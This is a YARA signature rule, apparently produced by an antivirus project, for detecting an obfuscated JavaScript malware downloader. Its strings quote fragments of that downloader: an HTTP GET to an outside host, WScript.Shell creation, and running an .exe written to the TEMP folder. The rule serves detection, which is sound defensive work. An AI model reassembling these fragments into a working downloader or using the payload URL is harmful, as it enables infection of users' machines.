rule sig_20160401_9437bf30da7f5f90dcbf748f314edae6 {
  meta:
    description = "datamaliciousorder - file 20160401_9437bf30da7f5f90dcbf748f314edae6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "59109d365193043d6818dfc2f13b848617a1bb57ea7c6c8ca298f237d12b933b"

  strings:
    $s1  = "VysIhq[NbxCy](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var UsvHp = function UzNc() {return WScript[OpWig](\"WScript\"+\".Shell\");}(), GuoZf = 11;" fullword ascii
    $s3  = "function RijWm(TgkWk, WwPqf){UdqDa = UdqDa * 1; return TgkWk - WwPqf;};" fullword ascii
    $s4  = "if (VysIhq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DwoIs(){return LtAd + \"\";};" fullword ascii
    $s6  = "function BqmQpu() {return UsvHp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yxQlgE7IC0K.ex\" + \"e\";};" fullword ascii
    $s7  = "function BfkZc() {return ((OxOfi == true) && (OxOfi == KdDee)) ? 1 : UdqDa;};" fullword ascii
    $s8  = "var RmZmn = false;" fullword ascii
    $s9  = "function BsnGle(){return OpWig;};" fullword ascii
    $s10 = "var MyPmf = new this[\"Date\"]();" fullword ascii
    $s11 = "function YdGfg(PiaMm){UsvHp[\"R\"+\"un\"](PiaMm, UdqDa, UdqDa);};" fullword ascii
    $s12 = "return RijWm(BaGe, CtoFck);" fullword ascii
    $s13 = "}while (BzTd);" fullword ascii
    $s14 = "function XtuWt(JprHo) {var AkYdx = (1, 2, 3, 4, 5, JprHo); return AkYdx;};" fullword ascii
    $s15 = "function RblSiq()" fullword ascii
    $s16 = "function FpVnz(){return 23;};" fullword ascii
    $s17 = "var OxOfi = false;" fullword ascii
    $s18 = "var KdDee = false;" fullword ascii
    $s19 = "OxOfi = true; " fullword ascii
    $s20 = "KdDee = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}